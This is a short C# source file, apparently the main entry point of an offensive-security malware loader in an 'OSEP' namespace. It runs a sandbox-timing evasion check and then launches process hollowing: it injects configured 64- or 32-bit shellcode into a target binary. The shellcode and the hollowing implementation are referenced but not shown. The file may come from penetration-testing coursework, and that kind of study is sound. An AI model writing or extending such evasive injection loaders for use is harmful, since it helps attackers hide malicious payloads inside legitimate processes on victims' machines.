using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static OSEP.Entry;

namespace OSEP
{

    internal class Entry
    {
        
        static void Main(string[] args)
        {
            Debug.RunDebug("\nMain started");

            if (CONFIG.DETECT_SANDBOX_TIME)
                Evasion.SandboxTimeDetect(2000);


#if X64
            CreateHollowProcess chp = new CreateHollowProcess(CONFIG.HOLLOW_BINARY_TARGET, CONFIG.SHELLCODE64);
#elif X86
            CreateHollowProcess chp = new CreateHollowProcess(CONFIG.HOLLOW_BINARY_TARGET, CONFIG.SHELLCODE86);
#endif

            chp.StartProcess();

        }
    }
}
